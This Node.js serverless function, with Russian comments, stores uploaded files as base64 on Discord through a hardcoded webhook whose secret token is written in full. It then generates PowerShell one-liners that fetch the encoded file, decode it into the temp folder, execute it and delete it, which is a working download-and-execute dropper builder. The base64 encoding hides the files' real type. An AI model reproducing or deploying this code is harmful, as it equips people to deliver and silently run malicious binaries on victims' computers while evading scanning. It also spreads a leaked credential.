const https = require('https');
const formidable = require('formidable');
const fs = require('fs');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// Настройка для Vercel
module.exports.config = {
  api: {
    bodyParser: false,
  },
};

function sendDiscordMessage(content) {
  return new Promise((resolve, reject) => {
    try {
      const webhookUrl = new URL(DISCORD_WEBHOOK);
      const data = JSON.stringify({ content });
      const req = https.request({
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
      }, res => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => resolve(body));
      });
      req.on('error', reject);
      req.write(data);
      req.end();
    } catch (e) {
      reject(e);
    }
  });
}

function uploadFileToDiscord(filePath, filename) {
  return new Promise((resolve, reject) => {
    try {
      const fileContent = fs.readFileSync(filePath);
      const base64Content = fileContent.toString('base64');
      const encodedFilename = (filename || 'file').replace(/\.[^/.]+$/, '') + '.b64';
      const boundary = '----DiscordBoundary' + Math.random().toString(36).substring(2);
      
      const header = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`;
      const footer = `\r\n--${boundary}--\r\n`;
      
      const body = Buffer.concat([
        Buffer.from(header),
        Buffer.from(base64Content),
        Buffer.from(footer)
      ]);
      
      const webhookUrl = new URL(DISCORD_WEBHOOK);
      const req = https.request({
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': body.length
        }
      }, res => {
        let responseData = '';
        res.on('data', chunk => responseData += chunk);
        res.on('end', () => {
          try {
            const json = JSON.parse(responseData);
            if (json.attachments && json.attachments[0]) {
              resolve({ fileUrl: json.attachments[0].url, originalName: filename });
            } else {
              reject(new Error('Discord upload failed'));
            }
          } catch (e) {
            reject(new Error('Invalid Discord response'));
          }
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    } catch (e) {
      reject(e);
    }
  });
}

// Главный обработчик (CommonJS формат)
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

  const form = formidable({ multiples: true, maxFileSize: 4.5 * 1024 * 1024 });

  return new Promise((resolve) => {
    form.parse(req, async (err, fields, files) => {
      if (err) {
        res.status(500).json({ success: false, error: 'Form error: ' + err.message });
        return resolve();
      }

      const fileEntries = [];
      const uploadedFiles = files.fileToUpload;
      if (Array.isArray(uploadedFiles)) {
        fileEntries.push(...uploadedFiles);
      } else if (uploadedFiles) {
        fileEntries.push(uploadedFiles);
      }

      if (fileEntries.length === 0) {
        res.status(400).json({ success: false, error: 'No files uploaded' });
        return resolve();
      }

      try {
        const uploadResults = [];
        for (const file of fileEntries) {
          const path = file.filepath || file.path;
          const name = file.originalFilename || file.name;
          const result = await uploadFileToDiscord(path, name);
          uploadResults.push(result);
        }

        let combinedCmd = '';
        if (uploadResults.length === 1) {
          const r = uploadResults[0];
          combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
        } else {
          let varDefs = [], cmdParts = [], startParts = [], tVars = [];
          uploadResults.forEach((r, i) => {
            const idx = i + 1;
            varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`, `$u${idx}='${r.fileUrl}'`);
            cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
            startParts.push(`Start-Process $t${idx} -Wait`);
            tVars.push(`$t${idx}`);
          });
          combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
        }

        const fileNames = uploadResults.map(r => r.originalName).join(', ');
        await sendDiscordMessage(`📁 **${fileNames}**\n\nКоманда для запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``);

        res.status(200).json({ success: true, files: uploadResults, command: combinedCmd });
        resolve();
      } catch (error) {
        res.status(500).json({ success: false, error: 'Process error: ' + error.message });
        resolve();
      }
    });
  });
};
